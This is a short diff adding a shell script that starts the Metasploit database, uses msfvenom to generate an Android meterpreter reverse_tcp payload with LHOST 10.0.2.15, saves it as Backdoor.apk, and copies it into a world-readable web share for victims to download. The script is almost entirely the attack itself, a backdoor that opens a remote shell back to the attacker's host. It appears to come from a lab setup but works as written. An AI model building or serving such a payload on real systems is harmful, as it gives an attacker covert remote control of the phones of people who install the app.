@@ -1,0 +1,8 @@
+cd    
+service postgresql start  
+msfvenom -p android/meterpreter/reverse_tcp --platform  android -a dalvik LHOST=10.0.2.15 R > Backdoor.apk
+chmod -R 755  /var/www/html/share
+chmod -R 755  var/www/html/share 
+chmod -R 755  var/www/html/share   
+cp /root/Backdoor.apk /var/www/html/share            
+         
